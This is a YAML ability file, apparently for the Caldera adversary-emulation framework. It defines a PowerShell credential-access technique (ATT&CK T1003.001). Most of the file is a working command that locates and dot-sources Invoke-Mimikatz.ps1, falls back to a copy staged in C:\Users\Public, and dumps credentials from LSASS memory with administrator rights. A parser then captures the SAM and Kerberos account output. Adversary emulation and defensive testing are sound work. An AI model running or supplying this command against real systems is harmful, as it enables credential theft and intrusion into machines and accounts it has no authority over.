# UUID: 18c9d0e1-f2a3-4b4c-8d5e-6f7a8b9c0d25
id: 18c9d0e1-f2a3-4b4c-8d5e-6f7a8b9c0d25
name: Dump LSASS Memory with Mimikatz (PowerShell)
description: Uses an Invoke-Mimikatz PowerShell script to dump credentials from LSASS. Requires the script as a payload.
tactic: credential-access
technique_id: T1003.001 # LSASS Memory
privilege: Administrator
payloads:
  - Invoke-Mimikatz.ps1 # Ensure this payload is in the plugin's /payloads directory
platforms:
  windows:
    psh:
      command: |
        # Caldera stages payloads to a dynamic path. Agent should find it.
        # This command assumes the agent copies payloads to its execution dir or knows where to find them.
        # Or, you can reference it via a path provided by Caldera if the agent supports that.
        $mimikatzPayload = Get-ChildItem -Path "." -Filter "Invoke-Mimikatz.ps1" -Recurse | Select-Object -First 1 -ExpandProperty FullName
        if ($mimikatzPayload) {
            . $mimikatzPayload
            Invoke-Mimikatz -DumpCreds -Quiet | Out-String
        } else {
            Write-Error "Invoke-Mimikatz.ps1 payload not found in agent's working directory."
            # Try a common staging location if not found locally
            $StagedMimikatz = "C:\Users\Public\Invoke-Mimikatz.ps1" # Example if staged by another ability
            if (Test-Path $StagedMimikatz) {
                . $StagedMimikatz
                Invoke-Mimikatz -DumpCreds -Quiet | Out-String
            } else {
                Write-Error "Invoke-Mimikatz.ps1 not found in common staging location either."
            }
        }
      parsers:
        plugins.stockpile.app.parsers.basic: # Mimikatz output parsing is complex and highly specific
          - source: host.user.credentials.mimikatz_output
            edge: Contains
            regex: '(?s)(.*SAM Account.*|.*Kerberos Accounts.*)' # Generic catch-all, needs refinement
